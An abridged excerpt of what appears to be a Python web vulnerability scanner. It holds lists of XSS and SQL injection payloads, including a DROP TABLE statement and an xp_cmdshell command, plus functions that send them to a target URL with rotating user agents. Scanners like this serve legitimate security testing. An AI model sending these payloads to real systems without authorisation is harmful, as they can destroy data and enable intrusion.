...
XSS_PAYLOADS = [
    ...
    "<img src='nonexistent.jpg' onerror='alert(1)'>",  # Event-based XSS
    "<svg/onload=alert(1)>",  # SVG-based XSS
    "<a href='javascript:alert(1)'>Click me</a>",  # JavaScript in link
    "<div onmouseover='alert(1)'>Hover me</div>",  # Event trigger XSS
    "<body onload='alert(1)'>",  # Onload event
    "<iframe src='javascript:alert(1)'></iframe>"  # Iframe-based XSS
]

SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",  # Classic tautology-based SQL injection
    "' OR 1=1 --",  # Another tautology-based SQL injection
    "'; DROP TABLE users --",  # SQL statement termination and destructive query (check for SQL errors)
    "' UNION SELECT null, null --",  # UNION-based SQL injection for data retrieval
    "'; SLEEP(5) --",  # Time-based blind SQL injection to check for delays
    "' AND 1=2 --",  # Conditional false (should not return anything if no vulnerability)
    "'; EXEC xp_cmdshell('ping 127.0.0.1') --"  # OS command injection (requires higher privileges)
]
...
def check_sql_injection(url, payloads=SQL_INJECTION_PAYLOADS, timeout=5, retries=3):
    """
    ...
    for payload in payloads:
        ...
        while attempt < retries:
            try:
                ...
                error_indicators = ["mysql", "sql syntax", "sqlstate", "you have an error", "database error", "syntax error"]
                ...
                # Check for time-based SQL injection by response delay (only if the payload causes delay)
...
def check_xss(url, payloads=XSS_PAYLOADS, timeout=5, retries=3):
    """
    Function to check for reflected XSS vulnerabilities.
    """
    headers = {"User-Agent": get_random_user_agent()}
    for payload in payloads:
        ...
        while attempt < retries:
            try:
                ...
                if payload in response.text:
                    # Optionally, add more sophisticated checks for script execution
